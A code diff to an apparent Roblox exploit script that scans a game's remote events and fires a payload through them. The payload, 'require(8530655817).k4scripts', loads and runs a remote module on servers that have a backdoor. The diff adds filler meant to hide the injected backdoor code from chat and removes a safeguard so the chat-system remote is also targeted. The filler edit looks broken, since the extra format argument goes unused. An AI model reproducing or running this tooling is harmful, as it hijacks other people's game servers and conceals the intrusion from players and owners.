@@ -16,19 +16,20 @@
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
 ]]
 
+local dateTimeNow = DateTime.now
+local tableFind = table.find
+local taskSpawn = task.spawn
+local taskWait = task.wait
+local stringRep = string.rep
+
 local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local JointsService = game:GetService("JointsService")
 local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
-local requireScript = ("require(8530655817).k4scripts('%s', %s)"):format(LocalPlayer.Name, "true") -- set true to false to disable logging
+local requireScript = ("require(8530655817).k4scripts('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
 local invCode = "6HndYgC"
-
-local dateTimeNow = DateTime.now
-local tableFind = table.find
-local taskSpawn = task.spawn
-local taskWait = task.wait
 
 local alternativeSS = {
 	run = { [1] = "5#lGIERKWEF" },
@@ -77,7 +78,7 @@ local function validRemote(rm)
 		if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
         (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
 
-		if (Parent.ClassName == "Folder" and Parent.Name == "DefaultChatSystemChatEvents" and Parent.Parent == ReplicatedStorage) then return false end
+-- 		if (Parent.ClassName == "Folder" and Parent.Name == "DefaultChatSystemChatEvents" and Parent.Parent == ReplicatedStorage) then return false end
 	end
 
 	if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
